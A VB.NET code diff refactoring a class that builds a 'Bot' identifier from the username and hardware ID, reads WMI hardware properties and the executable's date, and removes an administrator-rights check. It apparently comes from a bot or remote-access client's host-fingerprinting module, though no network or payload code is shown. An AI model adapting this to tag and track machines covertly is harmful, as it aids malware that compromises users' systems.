@@ -8,7 +8,7 @@ Public Class C_ID
 
     Public Shared Function Bot()
         Try
-            Return C_ID.UserName & "_" & C_ID.HWID
+            Return UserName() & "_" & HWID()
         Catch ex As Exception
             Return "Error"
         End Try
@@ -42,24 +42,10 @@ Public Class C_ID
         End Try
     End Function
 
-    Public Shared Function AmiAdmin()
-        Try
-            Dim id As Security.Principal.WindowsIdentity = Security.Principal.WindowsIdentity.GetCurrent()
-            Dim p As Security.Principal.WindowsPrincipal = New Security.Principal.WindowsPrincipal(id)
-            If p.IsInRole(Security.Principal.WindowsBuiltInRole.Administrator) Then
-                Return "Administrator"
-            Else
-                Return "User"
-            End If
-        Catch ex As Exception
-            Return "Error"
-        End Try
-    End Function
-
     Public Shared Function INDATE() As String
         Try
             Dim file As New IO.FileInfo(Windows.Forms.Application.ExecutablePath)
-            Return CType(file, IO.FileInfo).LastWriteTime.ToString("dd/MM/yyy")
+            Return file.LastWriteTime.ToString("dd/MM/yyy")
         Catch ex As Exception
             Return "Error"
         End Try
@@ -80,9 +66,9 @@ Public Class C_ID
     Private Shared Function Identifier(ByVal wmiClass As String, ByVal wmiProperty As String) As String
         Try
             Dim result As String = ""
-            Dim mc As Management.ManagementClass = New System.Management.ManagementClass(wmiClass)
-            Dim moc As Management.ManagementObjectCollection = mc.GetInstances()
-            For Each mo As Management.ManagementObject In moc
+            Dim mc As ManagementClass = New ManagementClass(wmiClass)
+            Dim moc As ManagementObjectCollection = mc.GetInstances()
+            For Each mo As ManagementObject In moc
                 If result = "" Then
                     Try
                         result = mo(wmiProperty).ToString()
